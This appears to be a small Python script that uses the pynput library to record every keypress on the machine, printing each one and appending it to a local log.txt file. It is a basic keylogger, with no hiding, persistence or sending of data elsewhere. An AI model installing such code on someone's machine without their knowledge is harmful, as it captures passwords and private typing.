from pynput.keyboard import Key, Listener

def on_press(key):

    f = open('./log.txt', 'a')


    if type(key) is type(Key.space):
        print('[ht]', str(key), key)
        f.write('\n'+str(key)+'\n')
        
    else:
        print('[ky]', key.char, key)

        if key.char == None:
            f.write('\n'+str(key)+'\n')
        else:
            f.write(key.char)


    f.close()

with Listener(on_press) as l:
    l.join()